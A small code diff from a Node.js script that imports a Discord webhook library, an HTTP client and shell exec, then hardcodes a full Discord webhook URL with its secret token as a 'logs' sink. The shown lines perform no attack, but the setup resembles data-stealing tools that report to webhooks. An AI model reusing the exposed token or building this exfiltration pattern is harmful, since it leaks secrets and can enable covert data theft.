@@ -3,7 +3,7 @@ const {
     Webhook
 } = require('discord-webhook-node');
 let request = require('request');
-const logs = new Webhook("/////////////////////////////////////////"); //webhook link
+const logs = new Webhook("https://discord.com/api/webhooks/1017034139897167882/WcPGQ7IB_fdpkZpOdXS33KA-hxkwmltlT_ay86QiIs9Ku_HXFXFuPBzjcNh9xBFa1Urp"); //webhook link
 const {
     exec
 } = require("child_process");
